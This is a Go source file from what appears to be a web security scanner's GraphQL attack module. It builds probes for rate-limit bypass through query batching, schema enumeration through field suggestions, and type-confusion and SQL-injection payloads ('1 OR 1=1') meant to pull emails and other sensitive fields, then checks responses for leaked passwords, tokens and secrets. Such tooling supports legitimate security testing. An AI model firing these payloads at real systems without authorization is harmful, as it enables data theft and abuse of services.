package graphqlattack

import (
	"encoding/json"
	"fmt"
	"strings"
)

// Probe is a GraphQL abuse request body.
type Probe struct {
	Body   string
	Name   string
	Signal string
}

// BuildBatchProbe creates a batched GraphQL request to bypass rate limits.
func BuildBatchProbe(count int) Probe {
	if count <= 0 {
		count = 50
	}
	if count > 200 {
		count = 200
	}
	ops := make([]map[string]string, count)
	for i := 0; i < count; i++ {
		ops[i] = map[string]string{"query": fmt.Sprintf("{ __typename } #%d", i)}
	}
	raw, _ := json.Marshal(ops)
	return Probe{
		Body:   string(raw),
		Name:   "batch_abuse",
		Signal: "graphql_batch_accepted",
	}
}

// BuildSuggestionsProbe creates a query with a non-existent field to trigger field suggestions.
func BuildSuggestionsProbe(field string) Probe {
	field = sanitizeField(field)
	return Probe{
		Body:   fmt.Sprintf(`{"query":"{%s_nonexistent_field_xyz}"}`, field),
		Name:   "field_suggestions",
		Signal: "graphql_field_suggestions",
	}
}

// BuildTypeInversionProbes returns type-mutation probes for ORM/NoSQL confusion.
func BuildTypeInversionProbes(field string) []Probe {
	field = sanitizeField(field)
	return []Probe{
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: true) { id email } }"}`, field),
			Name:   "bool_id",
			Signal: "type_inversion_bool",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: [1,2,3]) { id email } }"}`, field),
			Name:   "array_id",
			Signal: "type_inversion_array",
		},
		{
			Body:   fmt.Sprintf(`{"query":"query($id: Int!) { %s(id: $id) { id email } }", "variables":{"id":[1,2,3]}}`, field),
			Name:   "variable_array",
			Signal: "type_inversion_variable",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: \"1 OR 1=1\") { id email } }"}`, field),
			Name:   "string_sqli_id",
			Signal: "type_inversion_string",
		},
	}
}

// Analyze compares baseline and probe GraphQL responses.
func Analyze(baselineBody, probeBody string, probe Probe) (bool, string) {
	if probeBody == "" || probeBody == baselineBody {
		return false, ""
	}
	lower := strings.ToLower(probeBody)
	baseLower := strings.ToLower(baselineBody)

	switch probe.Signal {
	case "graphql_batch_accepted":
		if strings.Count(probeBody, `"data"`) >= 5 || strings.Count(probeBody, `__typename`) >= 5 {
			return true, probe.Signal
		}
	case "graphql_field_suggestions":
		// Check if the server responds with auto-suggestions for schema enumeration.
		if (strings.Contains(lower, "did you mean") || strings.Contains(lower, "perhaps you meant")) &&
			!strings.Contains(baseLower, "did you mean") {
			return true, "field_suggestions_exposed"
		}
	case "type_inversion_bool", "type_inversion_array", "type_inversion_variable", "type_inversion_string":
		// Broaden data leak analysis to include all common sensitive keywords.
		hasLeak := false
		for _, kw := range []string{"email", "password", "token", "secret", "admin", "credential", "session", "oauth"} {
			if strings.Contains(lower, kw) && !strings.Contains(baseLower, kw) {
				hasLeak = true
				break
			}
		}
		if len(probeBody) > len(baselineBody)*2 && hasLeak {
			return true, "type_inversion_data_leak"
		}
		for _, kw := range []string{"cannot represent", "expected type", "int cannot", "validation error", "bad user input"} {
			if strings.Contains(lower, kw) && !strings.Contains(baseLower, kw) {
				return true, "type_inversion_error_disclosure"
			}
		}
		if strings.Count(probeBody, `"id"`) > strings.Count(baselineBody, `"id"`)+2 {
			return true, probe.Signal
		}
	}
	return false, ""
}

func sanitizeField(field string) string {
	if field == "" || strings.EqualFold(field, "body") {
		return "user"
	}
	for _, ch := range field {
		if (ch < 'a' || ch > 'z') && (ch < 'A' || ch > 'Z') && (ch < '0' || ch > '9') && ch != '_' {
			return "user"
		}
	}
	return field
}
